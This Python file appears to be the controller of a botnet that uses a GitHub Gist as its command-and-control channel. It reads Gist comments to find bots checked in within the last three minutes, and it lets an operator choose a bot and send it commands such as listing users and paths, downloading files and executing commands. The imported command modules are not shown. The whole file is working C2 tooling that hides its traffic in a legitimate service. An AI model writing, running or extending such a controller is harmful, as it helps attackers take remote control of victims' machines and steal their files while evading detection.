import string
import time
from datetime import date, timedelta, datetime
from github import GistComment
import pytz

from Commands import ListUsersCommand, ListPath, UserId, FileDownload, ExecuteCommand, commands
from Util import *

tz = pytz.timezone("UTC")


def filter_nonactive_comments(comment: GistComment):
    return ACTIVITY_COMMENT in comment.body and tz.localize(comment.updated_at) >= datetime.now(tz) - timedelta(
        minutes=3)


def get_all_active_bots(gist: Gist) -> [string]:
    splice = len(ACTIVITY_COMMENT)
    comments = get_all_comments(gist)
    active_bots = list(map(lambda c: c.body[splice:], filter(filter_nonactive_comments, comments)))
    active_bots.sort()
    return active_bots




def main():
    g = login()
    gist = g.get_gist(get_gist_id())
    if gist.description != GIST_TEXT:
        gist.edit(description=GIST_TEXT)

    while True:
        active_bots = get_all_active_bots(gist)

        print(f"There are {len(active_bots)} bots online")
        if len(active_bots) == 0:
            time.sleep(2)
            continue

        for i, bot in enumerate(active_bots):
            print(f"{i} - {bot}")
        try:
            resp = input("To which send command ? Type his number, or q to quit \n")
            if resp == "q":
                break
            target = active_bots[int(resp)]
        except:
            print("invalid target")
            continue

        try:
            print("Available commands :")
            for i, command in enumerate(commands):
                print(f"{i} - {command.info()}")

            command_num = int(input("Which command?"))
            command = commands[command_num]
        except:
            print("invalid command")
            continue

        print(f"Sending command {command_num} to {target}")
        try:
            command.send(gist, target)
        except TimeoutError:
            print("Command timed out.")

        time.sleep(1)
    print("Exiting controller")

if __name__ == '__main__':
    main()
